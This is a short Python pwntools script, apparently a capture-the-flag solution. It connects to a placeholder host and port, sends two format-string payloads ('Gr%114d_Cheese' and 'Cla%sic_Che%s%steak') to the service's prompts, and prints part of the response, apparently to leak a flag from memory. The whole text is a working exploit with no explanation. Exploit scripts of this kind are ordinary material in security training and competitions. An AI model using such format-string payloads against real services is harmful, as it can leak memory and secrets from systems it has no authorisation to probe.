from pwn import *
import time

host = 'HOST_HERE'
port = PORT_HERE

payload1 = 'Gr%114d_Cheese'
payload2 = 'Cla%sic_Che%s%steak'


bin = remote(host,port)

bin.sendlineafter(': ', payload1)
time.sleep(1)
bin.sendlineafter(': ', payload2)
out = bin.recvall()

print(out[477:])
